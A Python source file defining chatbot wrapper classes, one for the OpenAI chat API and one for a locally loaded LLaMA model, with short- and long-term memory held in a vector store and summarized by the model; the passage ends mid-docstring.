import os
import tiktoken
import openai
import torch
from box import Box
from transformers import LlamaTokenizer, LlamaForCausalLM, LlamaConfig
from datetime import datetime
from typing import Any
from time import sleep
import transformers

from memory_manager import MemoryManager
from assistant_transformers_patch import patch_model
from text_encoder import KeywordEncoderInferenceModel


class OpenAIAssistant():
    """
    ChatGPT wrapper for OpenAI API
    """
    def __init__(
            self,
            api_key: str, 
            chat_model: str = 'gpt-3.5-turbo', 
            embedding_model: Any = 'text-embedding-ada-002', 
            enc: str = 'gpt2', 
            short_term_memory_summary_prompt: str = None, 
            long_term_memory_summary_prompt: str = None, 
            system_prompt: str = "", 
            short_term_memory_max_tokens: int = 750, 
            long_term_memory_max_tokens: int = 500,
            knowledge_retrieval_max_tokens: int = 1000,
            short_term_memory_summary_max_tokens: int = 300, 
            long_term_memory_summary_max_tokens: int = 300,
            knowledge_retrieval_summary_max_tokens: int = 600,
            summarize_short_term_memory: bool = False,
            summarize_long_term_memory: bool = False,
            summarize_knowledge_retrieval: bool = False,
            use_long_term_memory: bool = False,
            long_term_memory_collection_name: str = 'long_term_memory', 
            use_short_term_memory: bool = False, 
            use_knowledge_retrieval: bool = False,
            knowledge_retrieval_collection_name: str = 'knowledge_retrieval',
            price_per_token: float = 0.000002, 
            max_seq_len: int = 4096, 
            memory_manager: MemoryManager = None,
            debug: bool = False
        ) -> None:
        """
        Initialize the OpenAIAssistant

        Parameters:
            api_key (str): The OpenAI API key
            chat_model (str): The model to use for chat
            embedding_model (Any): The model to use for embeddings
            enc (str): The encoding to use for the model
            short_term_memory_summary_prompt (str): The prompt to use for short term memory summarization
            long_term_memory_summary_prompt (str): The prompt to use for long term memory summarization
            system_prompt (str): The system prompt to use for the model
            short_term_memory_max_tokens (int): The maximum number of tokens to store in short term memory
            long_term_memory_max_tokens (int): The maximum number of tokens to store in long term memory
            knowledge_retrieval_max_tokens (int): The maximum number of tokens to store in knowledge retrieval
            short_term_memory_summary_max_tokens (int): The maximum number of tokens to store in short term memory summary
            long_term_memory_summary_max_tokens (int): The maximum number of tokens to store in long term memory summary
            knowledge_retrieval_summary_max_tokens (int): The maximum number of tokens to store in knowledge retrieval summary
            summarize_short_term_memory (bool): Whether to use short term memory summarization
            summarize_long_term_memory (bool): Whether to use long term memory summarization
            summarize_knowledge_retrieval (bool): Whether to use knowledge retrieval summarization
            use_long_term_memory (bool): Whether to use long term memory
            long_term_memory_collection_name (str): The name of the long term memory collection
            use_short_term_memory (bool): Whether to use short term memory
            use_knowledge_retrieval (bool): Whether to use knowledge retrieval
            knowledge_retrieval_collection_name (str): The name of the knowledge retrieval collection
            price_per_token (float): The price per token in USD
            max_seq_len (int): The maximum sequence length
            memory_manager (MemoryManager): The memory manager to use for long term memory and knowledge retrieval
            debug (bool): Whether to enable debug mode
        """
        openai.api_key = api_key
        self.api_key = api_key
        self.chat_model = chat_model
        self.embedding_model = embedding_model
        self.enc = tiktoken.get_encoding(enc)
        self.memory_manager = memory_manager
        self.price_per_token = price_per_token
        self.short_term_memory = []
        self.short_term_memory_summary = ''
        self.long_term_memory_summary = ''
        self.knowledge_retrieval_summary = ''
        self.debug = debug

        self.summarize_short_term_memory = summarize_short_term_memory
        self.summarize_long_term_memory = summarize_long_term_memory
        self.summarize_knowledge_retrieval = summarize_knowledge_retrieval
        self.use_long_term_memory = use_long_term_memory
        self.long_term_memory_collection_name = 'long_term_memory' if long_term_memory_collection_name is None else long_term_memory_collection_name
        self.use_knowledge_retrieval = use_knowledge_retrieval
        self.knowledge_retrieval_collection_name = 'knowledge_retrieval' if knowledge_retrieval_collection_name is None else knowledge_retrieval_collection_name
        if self.memory_manager is None:
            self.use_long_term_memory = False
            self.use_knowledge_retrieval = False
        if self.use_long_term_memory and self.memory_manager is not None:
            self.memory_manager.create_collection(self.long_term_memory_collection_name)
        if self.use_knowledge_retrieval and self.memory_manager is not None:
            self.memory_manager.create_collection(self.knowledge_retrieval_collection_name)
        self.use_short_term_memory = use_short_term_memory

        self.short_term_memory_summary_max_tokens = short_term_memory_summary_max_tokens
        self.long_term_memory_summary_max_tokens = long_term_memory_summary_max_tokens
        self.knowledge_retrieval_summary_max_tokens = knowledge_retrieval_summary_max_tokens
        self.short_term_memory_max_tokens = short_term_memory_max_tokens
        self.long_term_memory_max_tokens = long_term_memory_max_tokens
        self.knowledge_retrieval_max_tokens = knowledge_retrieval_max_tokens

        self.system_prompt = system_prompt
        if short_term_memory_summary_prompt is None:
            self.short_term_memory_summary_prompt = "Summarize the following conversation:\n\nPrevious Summary: {previous_summary}\n\nConversation: {conversation}"
        else:
            self.short_term_memory_summary_prompt = short_term_memory_summary_prompt
        if long_term_memory_summary_prompt is None:
            self.long_term_memory_summary_prompt = "Summarize the following (out of order) conversation messages:\n\nPrevious Summary: {previous_summary}\n\nMessages: {conversation}"

        self.max_seq_len = max_seq_len

    def _construct_messages(self, prompt: str, inject_messages: list = []) -> list:
        """
        Construct the messages for the chat completion

        Parameters:
            prompt (str): The prompt to construct the messages for
            inject_messages (list): The messages to inject into the chat completion

        Returns:
            list: The messages to use for the chat completion
        """
        messages = []
        if self.system_prompt is not None and self.system_prompt != "":
            messages.append({
                "role": "system",
                "content": self.system_prompt
            })

        if self.use_long_term_memory:
            long_term_memory = self.query_long_term_memory(prompt, summarize=self.summarize_long_term_memory)
            if long_term_memory is not None and long_term_memory != '':
                messages.append({
                    "role": "system",
                    "content": long_term_memory
                })

        if self.summarize_short_term_memory:
            if self.short_term_memory_summary != '' and self.short_term_memory_summary is not None:
                messages.append({
                    "role": "system",
                    "content": self.short_term_memory_summary
                })

        if self.use_short_term_memory:
            for i, message in enumerate(self.short_term_memory):
                messages.append(message)

        if inject_messages is not None and inject_messages != []:
            for i in range(len(messages)):
                for y, message in enumerate(inject_messages):
                    if i == list(message.keys())[0]:
                        messages.insert(i, list(message.values())[0])
                        inject_messages.pop(y)
            for message in inject_messages:
                messages.append(list(message.values())[0])

        if prompt is None or prompt == "":
            return messages
        
        messages.append({
            "role": "user",
            "content": prompt
        })
        
        return messages

    def change_system_prompt(self, system_prompt: str) -> None:
        """
        Change the system prompt

        Parameters:
            system_prompt (str): The new system prompt to use
        """
        self.system_prompt = system_prompt

    def calculate_num_tokens(self, text: str) -> int:
        """
        Calculate the number of tokens in a given text

        Parameters:
            text (str): The text to calculate the number of tokens for

        Returns:
            int: The number of tokens in the text
        """
        return len(self.enc.encode(text))

    def calculate_short_term_memory_tokens(self) -> int:
        """
        Calculate the number of tokens in short term memory

        Returns:
            int: The number of tokens in short term memory
        """
        return sum([self.calculate_num_tokens(message['content']) for message in self.short_term_memory])
    
    def query_long_term_memory(self, query: str, summarize=False) -> str:
        """
        Query long term memory

        Parameters:
            query (str): The query to use for long term memory
            summarize (bool): Whether to summarize the long term memory

        Returns:
            str: The long term memory
        """
        embedding = self.get_embedding(query).data[0].embedding
        points = self.memory_manager.search_points(vector=embedding, collection_name=self.long_term_memory_collection_name, k=20)
        if len(points) == 0:
            return ''
        long_term_memory = ''
        if summarize:
            long_term_memory += 'Summary of previous related conversations from long term memory:' + self.generate_long_term_memory_summary(points) + '\n\n'
        if self.long_term_memory_max_tokens > 0:
            long_term_memory += 'Previous related conversations from long term memory:\n\n'
            for point in points:
                point = point.payload
                if self.calculate_num_tokens(long_term_memory + f"{point['user_message']['role'].title()}: {point['user_message']['content']}\n\n{point['assistant_message']['role'].title()}: {point['assistant_message']['content']}\n----------\n") > self.long_term_memory_max_tokens:
                    continue
                long_term_memory += f"{point['user_message']['role'].title()}: {point['user_message']['content']}\n\n{point['assistant_message']['role'].title()}: {point['assistant_message']['content']}\n----------\n"
        if long_term_memory == 'Previous related conversations from long term memory:\n\n':
            return ''
        elif long_term_memory.endswith('\n\nPrevious related conversations from long term memory:\n\n'):
            long_term_memory = long_term_memory.replace('\n\nPrevious related conversations from long term memory:\n\n', '')
        return long_term_memory.strip()

    def add_message_to_short_term_memory(self, user_message: dict, assistant_message: dict) -> None:
        """
        Add a message to short term memory

        Parameters:
            user_message (dict): The user message to add to short term memory
            assistant_message (dict): The assistant message to add to short term memory
        """
        self.short_term_memory.append(user_message)
        self.short_term_memory.append(assistant_message)
        while self.calculate_short_term_memory_tokens() > self.short_term_memory_max_tokens:
            if self.summarize_short_term_memory:
                self.generate_short_term_memory_summary()
            self.short_term_memory.pop(0) # Remove the oldest message (User message)
            self.short_term_memory.pop(0) # Remove the oldest message (OpenAIAssistant message)

    def add_message_to_long_term_memory(self, user_message: dict, assistant_message: dict) -> None:
        """
        Add a message to long term memory

        Parameters:
            user_message (dict): The user message to add to long term memory
            assistant_message (dict): The assistant message to add to long term memory
        """
        points = [
            {
                "vector": self.get_embedding(f'User: {user_message["content"]}\n\nAssistant: {assistant_message["content"]}').data[0].embedding,
                "payload": {
                    "user_message": user_message,
                    "assistant_message": assistant_message,
                    "timestamp": datetime.now().timestamp()
                }
            }
        ]
        self.memory_manager.insert_points(collection_name=self.long_term_memory_collection_name, points=points)

    def generate_short_term_memory_summary(self) -> None:
        """
        Generate a summary of short term memory
        """
        prompt = self.short_term_memory_summary_prompt.format(
            previous_summary=self.short_term_memory_summary,
            conversation=f'User: {self.short_term_memory[0]["content"]}\n\nAssistant: {self.short_term_memory[1]["content"]}'
        )
        if self.calculate_num_tokens(prompt) > self.max_seq_len - self.short_term_memory_summary_max_tokens:
            prompt = self.enc.decode(self.enc.encode(prompt)[:self.max_seq_len - self.short_term_memory_summary_max_tokens])
        summary_agent = OpenAIAssistant(self.api_key, system_prompt=None)
        self.short_term_memory_summary = summary_agent.get_chat_response(prompt, max_tokens=self.short_term_memory_summary_max_tokens).choices[0].message.content

    def generate_long_term_memory_summary(self, points: list) -> str:
        """
        Summarize long term memory

        Parameters:
            points (list): The points to summarize

        Returns:
            str: The summary of long term memory
        """
        prompt = self.long_term_memory_summary_prompt.format(
            previous_summary=self.long_term_memory_summary,
            conversation='\n\n'.join([f'User: {point.payload["user_message"]["content"]}\n\nAssistant: {point.payload["assistant_message"]["content"]}' for point in points])
        )
        if self.calculate_num_tokens(prompt) > self.max_seq_len - self.long_term_memory_summary_max_tokens:
            prompt = self.enc.decode(self.enc.encode(prompt)[:self.max_seq_len - self.long_term_memory_summary_max_tokens])
        summary_agent = OpenAIAssistant(self.api_key, system_prompt=None)
        self.long_term_memory_summary = summary_agent.get_chat_response(prompt, max_tokens=self.long_term_memory_summary_max_tokens).choices[0].message.content
        return self.long_term_memory_summary

    def calculate_price(self, prompt: str = None, num_tokens: int = None) -> float:
        """
        Calculate the price of a prompt (or number of tokens) in USD

        Parameters:
            prompt (str): The prompt to calculate the price of
            num_tokens (int): The number of tokens to calculate the price of

        Returns:
            float: The price of the generation in USD
        """
        assert prompt or num_tokens, "You must provide either a prompt or number of tokens"
        if prompt:
            num_tokens = self.calculate_num_tokens(prompt)
        return num_tokens * self.price_per_token

    def get_embedding(self, input: str, user: str = '', instructor_instruction: str = None) -> str:
        """
        Get the embedding for given text

        Parameters:
            input (str): The text to get the embedding for
            user (str): The user to get the embedding for
            instructor_instruction (str): The instructor instruction to get the embedding with

        Returns:
            str: The embedding for the prompt
        """
        if self.embedding_model is None:
            return None
        elif self.embedding_model == 'text-embedding-ada-002':
            return openai.Embedding.create(
                model=self.embedding_model,
                input=input,
                user=user
            )
        else:
            if instructor_instruction is not None:
                return self.embedding_model.encode([[instructor_instruction, input]])
            return self.embedding_model.encode([input])

    def get_chat_response(self, prompt: str, max_tokens: int = None, temperature: float = 1.0, top_p: float = 1.0, n: int = 1, stream: bool = False, frequency_penalty: float = 0, presence_penalty: float = 0, stop: list = None, logit_bias: dict = {}, user: str = '', max_retries: int = 3, inject_messages: list = []) -> str:
        """
        Get a chat response from the model

        Parameters:
            prompt (str): The prompt to generate a response for
            max_tokens (int): The maximum number of tokens to generate
            temperature (float): The temperature of the model
            top_p (float): The top_p of the model
            n (int): The number of responses to generate
            stream (bool): Whether to stream the response
            frequency_penalty (float): The frequency penalty of the model
            presence_penalty (float): The presence penalty of the model
            stop (list): The stop sequence of the model
            logit_bias (dict): The logit bias of the model
            user (str): The user to generate the response for
            max_retries (int): The maximum number of retries to generate a response
            inject_messages (list): The messages to inject into the prompt (key: index to insert at in short term memory (0 to prepend before all messages), value: message to inject)

        Returns:
            str: The chat response
        """
        messages = self._construct_messages(prompt, inject_messages=inject_messages)
        if self.debug:
            print(f'Messages: {messages}')

        iteration = 0
        while True:
            try:
                response = openai.ChatCompletion.create(
                    model=self.chat_model,
                    messages=messages,
                    temperature=temperature,
                    top_p=top_p,
                    n=n,
                    stream=stream,
                    stop=stop,
                    max_tokens=max_tokens,
                    presence_penalty=presence_penalty,
                    frequency_penalty=frequency_penalty,
                    logit_bias=logit_bias,
                    user=user
                )

                if self.use_short_term_memory:
                    self.add_message_to_short_term_memory(user_message={
                        "role": "user",
                        "content": prompt
                    }, assistant_message=response.choices[0].message.to_dict())

                if self.use_long_term_memory:
                    self.add_message_to_long_term_memory(user_message={
                        "role": "user",
                        "content": prompt
                    }, assistant_message=response.choices[0].message.to_dict())

                return response
            except Exception as e:
                iteration += 1
                if iteration >= max_retries:
                    raise e
                print('Error communicating with chatGPT:', e)
                sleep(1)


class LocalAssistant():
    """
    ChatGPT wrapper for local SERPy
    """
    def __init__(
            self,
            model_location: str,
            tokenizer_location: str,
            config_cache: str = None,
            lora_location: str = None,
            api_key: str = '', 
            embedding_model: Any = 'text-embedding-ada-002',
            user_string: str = 'Human',
            assistant_string: str = 'Assistant',
            short_term_memory_summary_prompt: str = None, 
            long_term_memory_summary_prompt: str = None, 
            system_prompt: str = "", 
            short_term_memory_max_tokens: int = 1024, 
            long_term_memory_max_tokens: int = 0,
            knowledge_retrieval_max_tokens: int = 0,
            short_term_memory_summary_max_tokens: int = 300, 
            long_term_memory_summary_max_tokens: int = 300,
            knowledge_retrieval_summary_max_tokens: int = 300,
            summarize_short_term_memory: bool = False,
            summarize_long_term_memory: bool = False,
            summarize_knowledge_retrieval: bool = False,
            use_long_term_memory: bool = False,
            long_term_memory_collection_name: str = 'long_term_memory', 
            use_short_term_memory: bool = False, 
            use_knowledge_retrieval: bool = False,
            knowledge_retrieval_collection_name: str = 'knowledge_retrieval',
            max_seq_len: int = 2048, 
            memory_manager: MemoryManager = None,
            device: torch.device = torch.device('cuda' if torch.cuda.is_available() else 'cpu'),
            use_fp32: bool = False,
            use_8bit: bool = False,
            use_quant: bool = False,
            debug: bool = False
        ) -> None:
        """
        Initialize the LocalAssistant

        Parameters:
            api_key (str): The OpenAI API key (if using ada embeddings, this is not required)
            model_location (str): The location of the model
            tokenizer_location (str): The location of the tokenizer
            config_cache (str): The location of the config cache (if using 4, 3, 2 bit quantization, this is required)
            lora_location (str): The location of the lora model (if using 4, 3, 2 bit quantization, this is not used)
            embedding_model (Any): The model to use for embeddings
            user_string (str): The user string
            assistant_string (str): The assistant string
            short_term_memory_summary_prompt (str): The prompt to use for short term memory summarization
            long_term_memory_summary_prompt (str): The prompt to use for long term memory summarization
            system_prompt (str): The system prompt to use for the model
            short_term_memory_max_tokens (int): The maximum number of tokens to store in short term memory
            long_term_memory_max_tokens (int): The maximum number of tokens to store in long term memory
            knowledge_retrieval_max_tokens (int): The maximum number of tokens to store in knowledge retrieval
            short_term_memory_summary_max_tokens (int): The maximum number of tokens to store in short term memory summary
            long_term_memory_summary_max_tokens (int): The maximum number of tokens to store in long term memory summary
            knowledge_retrieval_summary_max_tokens (int): The maximum number of tokens to store in knowledge retrieval summary
            summarize_short_term_memory (bool): Whether to use short term memory summarization
            summarize_long_term_memory (bool): Whether to use long term memory summarization
            summarize_knowledge_retrieval (bool): Whether to use knowledge retrieval summarization
            use_long_term_memory (bool): Whether to use long term memory
            long_term_memory_collection_name (str): The name of the long term memory collection
            use_short_term_memory (bool): Whether to use short term memory
            use_knowledge_retrieval (bool): Whether to use knowledge retrieval
            knowledge_retrieval_collection_name (str): The name of the knowledge retrieval collection
            price_per_token (float): The price per token in USD
            max_seq_len (int): The maximum sequence length
            memory_manager (MemoryManager): The memory manager to use for long term memory and knowledge retrieval
            device (torch.device): The device to use for the model
            use_fp32 (bool): Whether to use 32 bit precision
            use_8bit (bool): Whether to use 8 bit precision
            use_quant (bool): Whether to use quantization (4, 3, 2 bit precision)
            debug (bool): Whether to enable debug mode
        """
        if use_quant:
            from quantization.utils.llama_wrapper import LlamaClass
            from quantization.utils.modelutils import find_layers
            from quantization.utils.quant import make_quant
        if api_key is not None and api_key != '':
            openai.api_key = api_key
        self.api_key = api_key
        self.tokenizer = LlamaTokenizer.from_pretrained(tokenizer_location)
        self.tokenizer.pad_token = self.tokenizer.eos_token
        self.tokenizer.pad_token_id = self.tokenizer.eos_token_id
        self.tokenizer.add_bos_token = True
        self.use_quant = use_quant

        self.user_string = user_string
        self.assistant_string = assistant_string

        def skip(*args, **kwargs):
            pass

        torch.nn.init.kaiming_uniform_ = skip
        torch.nn.init.uniform_ = skip
        torch.nn.init.normal_ = skip
        torch.set_default_dtype(torch.half)
        transformers.modeling_utils._init_weights = False
        if not use_fp32:
            torch.set_default_dtype(torch.half)
        if use_quant:
            assert os.path.exists(model_location), "loading low-bit model requires checkpoint"
            assert os.path.exists(config_cache), "loading low-bit model requires config cache"
            config = LlamaConfig.from_pretrained(config_cache)
            self.chat_model = LlamaClass(config)
        elif use_8bit:
            self.chat_model =LlamaForCausalLM.from_pretrained(model_location, torch_dtype=torch.int8, load_in_8bit=True, device_map="auto")
        else:
            self.chat_model =LlamaForCausalLM.from_pretrained(model_location, torch_dtype=torch.float16 if not use_fp32 else torch.float32)
        torch.set_default_dtype(torch.float)
        self.chat_model.eval()
        if use_quant:
            layers = find_layers(self.chat_model)
            for name in ["lm_head"]:
                if name in layers:
                    del layers[name]
            ckpt = torch.load(model_location)
            make_quant(self.chat_model, ckpt["layers_bit"])
            print("Loading Quant model ...")
            self.chat_model.load_state_dict(ckpt["model"])
        else:
            if lora_location is not None:
                from peft import PeftModel
                self.chat_model = PeftModel.from_pretrained(self.chat_model, lora_location, torch_dtype=torch.float16 if not use_fp32 else torch.float32, device_map="auto")
        self.chat_model = patch_model(self.chat_model)
        self.chat_model.seqlen = max_seq_len
        if not use_8bit and not use_quant:
            self.chat_model.to(device)
        if api_key is None or api_key == '' and (use_long_term_memory == True or use_knowledge_retrieval == True):
            self.embedding_model = KeywordEncoderInferenceModel(max_len=512)
            self.embedding_dimension = 768
        else:
            self.embedding_model = embedding_model
            self.embedding_dimension = 1536
        self.memory_manager = memory_manager
        self.short_term_memory = []
        self.short_term_memory_summary = ''
        self.long_term_memory_summary = ''
        self.knowledge_retrieval_summary = ''
        self.debug = debug
        self.device = device

        if self.memory_manager is None:
            self.use_long_term_memory = False
            self.use_knowledge_retrieval = False

        self.summarize_short_term_memory = summarize_short_term_memory
        self.summarize_long_term_memory = summarize_long_term_memory
        self.summarize_knowledge_retrieval = summarize_knowledge_retrieval
        self.use_long_term_memory = use_long_term_memory
        if long_term_memory_collection_name is None:
            if isinstance(self.embedding_model, str):
                self.long_term_memory_collection_name = 'long_term_memory_768'
            else:
                self.long_term_memory_collection_name = 'long_term_memory'
        else:
            self.long_term_memory_collection_name = long_term_memory_collection_name
        if self.memory_manager and self.use_long_term_memory:
            self.memory_manager.create_collection(self.long_term_memory_collection_name, dimension=self.embedding_dimension)

        self.use_knowledge_retrieval = use_knowledge_retrieval
        if knowledge_retrieval_collection_name is None:
            if isinstance(self.embedding_model, str):
                self.knowledge_retrieval_collection_name = 'knowledge_retrieval_768'
            else:
                self.knowledge_retrieval_collection_name = 'knowledge_retrieval'
        else:
            self.knowledge_retrieval_collection_name = knowledge_retrieval_collection_name
        if self.memory_manager and self.use_knowledge_retrieval:
            self.memory_manager.create_collection(self.knowledge_retrieval_collection_name, dimension=self.embedding_dimension)
        
        self.use_short_term_memory = use_short_term_memory

        self.short_term_memory_summary_max_tokens = short_term_memory_summary_max_tokens
        self.long_term_memory_summary_max_tokens = long_term_memory_summary_max_tokens
        self.knowledge_retrieval_summary_max_tokens = knowledge_retrieval_summary_max_tokens
        self.short_term_memory_max_tokens = short_term_memory_max_tokens
        self.long_term_memory_max_tokens = long_term_memory_max_tokens
        self.knowledge_retrieval_max_tokens = knowledge_retrieval_max_tokens

        self.system_prompt = system_prompt
        if short_term_memory_summary_prompt is None:
            self.short_term_memory_summary_prompt = "Summarize the following conversation:\n\nPrevious Summary: {previous_summary}\n\nConversation: {conversation}"
        else:
            self.short_term_memory_summary_prompt = short_term_memory_summary_prompt
        if long_term_memory_summary_prompt is None:
            self.long_term_memory_summary_prompt = "Summarize the following (out of order) conversation messages:\n\nPrevious Summary: {previous_summary}\n\nMessages: {conversation}"

        self.max_seq_len = max_seq_len

    def _construct_messages(self, prompt: str, inject_messages: list = [], use_memories=True) -> list:
        """
        Construct the messages for the chat completion

        Parameters:
            prompt (str): The prompt to construct the messages for
            inject_messages (list): The messages to inject into the chat completion
            use_memories (bool): Whether to use memories

        Returns:
            list: The messages to use for the chat completion
        """
        messages = []
        if self.system_prompt is not None and self.system_prompt != "":
            messages.append({
                "role": "system",
                "content": self.system_prompt
            })

        if self.use_long_term_memory:
            long_term_memory = self.query_long_term_memory(prompt, summarize=self.summarize_long_term_memory)
            if long_term_memory is not None and long_term_memory != '':
                messages.append({
                    "role": "system",
                    "content": long_term_memory
                })

        if self.summarize_short_term_memory:
            if self.short_term_memory_summary != '' and self.short_term_memory_summary is not None:
                messages.append({
                    "role": "system",
                    "content": self.short_term_memory_summary
                })

        if self.use_short_term_memory:
            for i, message in enumerate(self.short_term_memory):
                messages.append(message)
       
        if inject_messages is not None and inject_messages != []:
            for i in range(len(messages)):
                for y, message in enumerate(inject_messages):
                    if i == list(message.keys())[0]:
                        messages.insert(i, list(message.values())[0])
                        inject_messages.pop(y)
            for message in inject_messages:
                messages.append(list(message.values())[0])

        if prompt is None or prompt == "":
            return messages

        messages.append({
            "role": "user",
            "content": prompt
        })
        
        return messages
    
    def _tokenize_stop_sequences(self, stop_sequences: list = []) -> list:
        """
        Tokenize the stop sequences

        Parameters:
            stop_sequences (list): The stop sequences to tokenize

        Returns:
            list: The tokenized stop sequences
        """
        self.tokenizer.add_bos_token = False
        stop_word_sequences = [self.tokenizer.encode(f"{self.user_string}:"), self.tokenizer.encode(f"{self.assistant_string}:"), self.tokenizer.encode(f"\n\n{self.user_string}:")[1:], self.tokenizer.encode(f"\n\n{self.assistant_string}:")[1:], [self.tokenizer.eos_token_id]] # defaults
        if stop_sequences is not None and stop_sequences != []:
            stop_word_sequences.extend([self.tokenizer.encode(stop_sequence) for stop_sequence in stop_sequences])
        # convert to tensor
        stop_word_sequences = [torch.tensor(stop_word_sequence, dtype=torch.long, device=self.device) for stop_word_sequence in stop_word_sequences]
        self.tokenizer.add_bos_token = True
        return stop_word_sequences

    def change_system_prompt(self, system_prompt: str) -> None:
        """
        Change the system prompt

        Parameters:
            system_prompt (str): The new system prompt to use
        """
        self.system_prompt = system_prompt

    def calculate_num_tokens(self, text: str) -> int:
        """
        Calculate the number of tokens in a given text

        Parameters:
            text (str): The text to calculate the number of tokens for

        Returns:
            int: The number of tokens in the text
        """
        return len(self.tokenizer.encode(text))

    def calculate_short_term_memory_tokens(self) -> int:
        """
        Calculate the number of tokens in short term memory

        Returns:
            int: The number of tokens in short term memory
        """
        return sum([self.calculate_num_tokens(message['content']) for message in self.short_term_memory])
    
    def query_long_term_memory(self, query: str, summarize=False) -> str:
        """
        Query long term memory

        Parameters:
            query (str): The query to use for long term memory
            summarize (bool): Whether to summarize the long term memory

        Returns:
            str: The long term memory
        """
        embedding = self.get_embedding(query).data[0].embedding
        points = self.memory_manager.search_points(vector=embedding, collection_name=self.long_term_memory_collection_name, k=20)
        if len(points) == 0:
            return ''
        long_term_memory = ''
        if summarize:
            long_term_memory += 'Summary of previous related conversations from long term memory:' + self.generate_long_term_memory_summary(points) + '\n\n'
        if self.long_term_memory_max_tokens > 0:
            long_term_memory += 'Previous related conversations from long term memory:\n\n'
            for point in points:
                point = point.payload
                if self.calculate_num_tokens(long_term_memory + f"{self.user_string}: {point['user_message']['content']}\n\n{self.assistant_string}: {point['assistant_message']['content']}\n----------\n") > self.long_term_memory_max_tokens:
                    continue
                long_term_memory += f"{self.user_string}: {point['user_message']['content']}\n\n{self.assistant_string}: {point['assistant_message']['content']}\n----------\n"
        if long_term_memory == 'Previous related conversations from long term memory:\n\n':
            return ''
        elif long_term_memory.endswith('\n\nPrevious related conversations from long term memory:\n\n'):
            long_term_memory = long_term_memory.replace('\n\nPrevious related conversations from long term memory:\n\n', '')
        return long_term_memory.strip()

    def add_message_to_short_term_memory(self, user_message: dict, assistant_message: dict) -> None:
        """
        Add a message to short term memory

        Parameters:
            user_message (dict): The user message to add to short term memory
            assistant_message (dict): The assistant message to add to short term memory
        """
        self.short_term_memory.append(user_message)
        self.short_term_memory.append(assistant_message)
        while self.calculate_short_term_memory_tokens() > self.short_term_memory_max_tokens:
            if self.summarize_short_term_memory:
                self.generate_short_term_memory_summary()
            self.short_term_memory.pop(0) # Remove the oldest message (User message)
            self.short_term_memory.pop(0) # Remove the oldest message (Assistant message)

    def add_message_to_long_term_memory(self, user_message: dict, assistant_message: dict) -> None:
        """
        Add a message to long term memory

        Parameters:
            user_message (dict): The user message to add to long term memory
            assistant_message (dict): The assistant message to add to long term memory
        """
        if isinstance(self.embedding_model, str):
            embedding = self.get_embedding(f'{self.user_string}: {user_message["content"]}\n\n{self.assistant_string}: {assistant_message["content"]}').data[0].embedding
        else:
            embedding = self.get_embedding(f'{self.user_string}: {user_message["content"]}\n\n{self.assistant_string}: {assistant_message["content"]}')[0].tolist()
        points = [
            {
                "vector": embedding,
                "payload": {
                    "user_message": user_message,
                    "assistant_message": assistant_message,
                    "timestamp": datetime.now().timestamp()
                }
            }
        ]
        self.memory_manager.insert_points(collection_name=self.long_term_memory_collection_name, points=points)

    def generate_short_term_memory_summary(self) -> None:
        """
        Generate a summary of short term memory
        """
        prompt = self.short_term_memory_summary_prompt.format(
            previous_summary=self.short_term_memory_summary,
            conversation=f'{self.user_string}: {self.short_term_memory[0]["content"]}\n\n{self.assistant_string}: {self.short_term_memory[1]["content"]}'
        )
        if self.calculate_num_tokens(prompt) > self.max_seq_len - self.short_term_memory_summary_max_tokens:
            prompt = self.tokenizer.decode(self.tokenizer.encode(prompt)[:self.max_seq_len - self.short_term_memory_summary_max_tokens])
        self.short_term_memory_summary = self.get_chat_response(prompt, max_tokens=self.short_term_memory_summary_max_tokens, save_memories=False, use_memories=False)['content']

    def generate_long_term_memory_summary(self, points: list) -> str:
        """
        Summarize long term memory

        Parameters:
            points (list): The points to summarize

        Returns:
            str: The summary of long term memory
        """
        prompt = self.long_term_memory_summary_prompt.format(
            previous_summary=self.long_term_memory_summary,
            conversation='\n\n'.join([f'{self.user_string}: {point.payload["user_message"]["content"]}\n\n{self.assistant_string}: {point.payload["assistant_message"]["content"]}' for point in points])
        )
        if self.calculate_num_tokens(prompt) > self.max_seq_len - self.long_term_memory_summary_max_tokens:
            prompt = self.tokenizer.decode(self.tokenizer.encode(prompt)[:self.max_seq_len - self.long_term_memory_summary_max_tokens])
        self.long_term_memory_summary = self.get_chat_response(prompt, max_tokens=self.long_term_memory_summary_max_tokens, save_memories=False, use_memories=False)['content']
        return self.long_term_memory_summary

    def get_embedding(self, input: str, user: str = '', instructor_instruction: str = None) -> str:
        """
        Get the embedding for given text

        Parameters:
            input (str): The text to get the embedding for
            user (str): The user to get the embedding for
            instructor_instruction (str): The instructor instruction to get the embedding with

        Returns:
            str: The embedding for the prompt
        """
        if self.embedding_model is None:
            return None
        elif self.embedding_model == 'text-embedding-ada-002':
            return openai.Embedding.create(
                model=self.embedding_model,
                input=input,
                user=user
            )
        else:
            if instructor_instruction is not None:
                return self.embedding_model.encode([[instructor_instruction, input]])
            return self.embedding_model([input])
        
    def _construct_prompt(self, messages: list) -> str:
        """
        Construct a prompt from a list of messages

        Parameters:
            messages (list): The messages to construct a prompt from

        Returns:
            str: The prompt
        """
        prompt = ''
        for message in messages:
            message_header = self.user_string if message['role'] == 'user' else message["role"].title()
            prompt += '\n\n' + f'{message_header}: {message["content"]}'
        prompt = prompt.strip() + f'\n\n{self.assistant_string}:'
        return prompt
    
    def _tokenize_prompt(self, prompt: str, stop_sequences: list = []) -> list:
        """
        Tokenize a prompt

        Parameters:
            prompt (str): The prompt to tokenize
            stop_sequences (list): The stop sequences to tokenize

        Returns:
            list: The tokenized prompt
        """
        tokenized = self.tokenizer(prompt, return_tensors="pt")
        input_ids = tokenized.input_ids.to(self.device)
        attention_mask = tokenized.attention_mask.to(self.device)
        stop_sequences = self._tokenize_stop_sequences(stop_sequences)

        return input_ids, attention_mask, stop_sequences
    
    def _post_process_text(self, text):
        text = text.strip()
        if text.endswith(f"{self.assistant_string}:"):
            text = text[:-len(f"{self.assistant_string}:")]
        elif text.endswith(f"{self.user_string}:"):
            text = text[:-len(f"{self.user_string}:")]
        return text.strip()

    def get_chat_response(self, prompt: str, max_tokens: int = 2048, min_tokens: int = 0, temperature: float = 0.9, top_k: int = 20, top_p: float = 1.0, n: int = 1, stream: bool = False, repetition_penalty: float = 1.0, length_penalty: float = 1.0, no_repeat_ngram_size: int = 0, inject_messages: list = [], use_memories=True, save_memories=True, stop_sequences: list = [], stop: list = [], logit_bias = {}, do_sample: bool = True, num_beams: int = 1, early_stopping: bool = False, frequency_penalty=None, presence_penalty=None, max_retries=3, use_openai_style_return=False) -> str:
        """
        Get a chat response from the model

        Parameters:
            prompt (str): The prompt to generate a response for
            max_tokens (int): The maximum number of tokens to generate
            min_tokens (int): The minimum number of tokens to generate
            temperature (float): The temperature to use for the response
